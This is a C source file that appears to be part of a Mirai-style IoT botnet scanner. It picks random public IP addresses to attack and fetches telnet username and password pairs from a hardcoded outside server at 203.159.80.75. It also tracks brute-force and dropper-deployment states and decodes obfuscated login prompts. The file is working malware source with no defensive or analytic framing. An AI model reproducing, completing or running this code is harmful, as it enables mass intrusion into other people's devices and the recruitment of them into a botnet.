static uint32_t get_random_ip(void)
{
	uint8_t buf[4] = {0};

	do
	{
		buf[0] = rand_new() % 0xff;
		buf[1] = rand_new() % 0xff;
		buf[2] = rand_new() % 0xff;
		buf[3] = rand_new() % 0xff;
	}
	while
	(
		buf[0] == 127 || buf[0] == 0 || (buf[0] == 192 && buf[1] == 168)
	);

	return INET_ADDR(buf[0],buf[1],buf[2],buf[3]);
}

static struct credentials *retrieve_credentials(void)
{
	struct credentials *c;
	int i = 0;
	int fd = 0;
	struct sockaddr_in addr;
	int ret = 0;
	char buf[DNS_TXT_MAX_SIZE];
	char *g = buf;
	struct resolve *dns;
	struct entry *e;
	uint16_t max_credentials = htons(MAX_TELNET_CREDENTIALS);

	if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		return NULL;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(7685);
	addr.sin_addr.s_addr = INET_ADDR(203,159,80,75);

	#ifdef DEBUG
	printf("Attempting to connect to the credential server!\n");
	#endif

	if(connect(fd, (struct sockaddr_in *)&addr, sizeof(addr)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to connect to the credential server\n");
		#endif
		//free(dns);
		close(fd);
		return NULL;
	}

	#ifdef DEBUG
	printf("Connected to the credential server!\n");
	#endif

	ret = send(fd, &max_credentials, sizeof(uint16_t), MSG_NOSIGNAL);
	if(ret < 1)
	{
		#ifdef DEBUG
		printf("Failed to send request for maximum credentials\n");
		#endif
		//free(dns);
		close(fd);
		return NULL;
	}

	#ifdef DEBUG
	printf("Sent request for maximum credentials!\n");
	#endif

	util_null(buf, 0, DNS_TXT_MAX_SIZE);

	ret = recv(fd, buf, DNS_TXT_MAX_SIZE, 0);
	if(ret < 1)
	{
		#ifdef DEBUG
		printf("Failed to receive the credentials\n");
		#endif
		//free(dns);
		close(fd);
		return NULL;
	}

	#ifdef DEBUG
	printf("Received the credentials!\n");
	#endif

	c = (struct credentials *)calloc(MAX_TELNET_CREDENTIALS * 2, sizeof(struct credentials));
	for(i = 0; i < MAX_TELNET_CREDENTIALS * 2; i++)
	{
		c[i].len = (uint8_t)*g++;
		c[i].str = (char *)malloc(c[i].len);
		util_memcpy(c[i].str, g, c[i].len);
		g += c[i].len;
	}

	#ifdef DEBUG
	for(i = 0; i < MAX_TELNET_CREDENTIALS * 2; i += 2)
		printf("Retrieved combinations \"%s:%s\"\n", c[i].str, c[i + 1].str);
	#endif

	close(fd);
	return c;
}

static void update_state(struct scan_struct *fd, uint8_t state)
{
	fd->timeout = time(NULL);
	fd->state = state;
}

static void reset_state(struct scan_struct *fd, uint8_t complete, uint8_t credential_index, uint8_t attempts)
{
	close(fd->fd);
	fd->fd = -1;
	fd->timeout = 0;
	fd->credential_index = credential_index;
	fd->state = CONNECTION_SETUP;
	fd->attempts = attempts;
	fd->complete = complete;
	if(complete == 1)
	{
		fd->bit = 0;
		fd->endianness = 0;
		fd->machine = 0;
		util_null(fd->arch, 0, 32);
		fd->upload_method = 0;
	}
	fd->dropper_index = 0;
}

static void check_timeout(struct scan_struct *fd, uint16_t timeout)
{
	uint32_t now = time(NULL);
	BOOL ret = fd->timeout + timeout < now ? TRUE : FALSE;

	if(ret)
	{
		#ifdef DEBUG
		//printf("Timeout after %d seconds - %d.%d.%d.%d:%d (case %d)\n", timeout, fd->destination_addr & 0xff, (fd->destination_addr >> 8) & 0xff, (fd->destination_addr >> 16) & 0xff, (fd->destination_addr >> 24) & 0xff, ntohs(fd->destination_port), fd->state);
		#endif
		if(fd->state == TELNET_READ_DEPLOY && fd->upload_method > 0)
		{
			reset_state(fd, 3, 0, 0);
			return;
		}
		else if(fd->state == TELNET_READ_DEPLOY && fd->upload_method == 0 && fd->machine == EM_ARM)
		{
			fd->machine = EM_ARM + 1;
			reset_state(fd, 3, 0, 0);
			return;
		}
		reset_state(fd, 1, 0, 0);
	}

	return;
}

static void unlock_prompt(uint8_t id)
{
	int i = 0;
	struct prompts *ptr = start;

	while(ptr)
	{
		if(ptr->id == id && ptr->d && ptr->u)
			ptr->u = FALSE;
		ptr = ptr->next;
	}

	return;
}

static BOOL contains_prompt(struct scan_struct *fd, uint8_t id)
{
	int i = 0;
	int found = 0;
	struct prompts *ptr = start;

	retry:
	while(ptr)
	{
		if(ptr->id == id && ptr->d && !ptr->u)
			break;
		ptr = ptr->next;
	}

	if(!ptr)
	{
		unlock_prompt(id);
		return FALSE;
	}

	// Lock the value so we can iterate over other data
	ptr->u = TRUE;

	for(i = 0; i < SCANNER_BUF_SIZE; i++)
	{
		if(fd->buf[i] == ptr->str[found])
		{
			if(++found == ptr->len)
				break;
		}
		else
		{
			found = 0;
		}
	}

	if(found)
	{
		unlock_prompt(id);
		return TRUE;
	}

	goto retry;
}

static void decode_prompts(void)
{
	int i = 0;
	struct prompts *ptr = start;
	char buf[DNS_TXT_MAX_SIZE];

	retry:
	while(ptr)
	{
		if(!ptr->d)
			break;
		ptr = ptr->next;
	}

	if(!ptr)
		return;

	// Copy the data over to a buffer
	for(i = 0; i < ptr->len; i++)
		buf[i] = ptr->str[i];
	
	// Reverse the data back to its original position
	for(i = 0; i < ptr->len; i += 2)
	{
		char tmp = buf[i];
		buf[i] = buf[i + 1];
		buf[i + 1] = tmp;
	}

	util_null(ptr->str, 0, ptr->len);
	decode(buf, ptr->str, ptr->len);
	ptr->d = TRUE;
	ptr->len = util_strlen(ptr->str);

	#ifdef DEBUG
	//printf("Decoded prompt \"%s\"!\n", ptr->str);
	#endif

	goto retry;
}

static void load_prompt(uint8_t id, char *str, int len)
{
	struct prompts *ptr = (struct prompts *)malloc(sizeof(struct prompts));
	ptr->id = id;
	ptr->next = start;
	ptr->len = len;
	ptr->d = FALSE;
	ptr->str = (char *)malloc(ptr->len);
	util_memcpy(ptr->str, str, ptr->len);
	start = ptr;
	return;
}

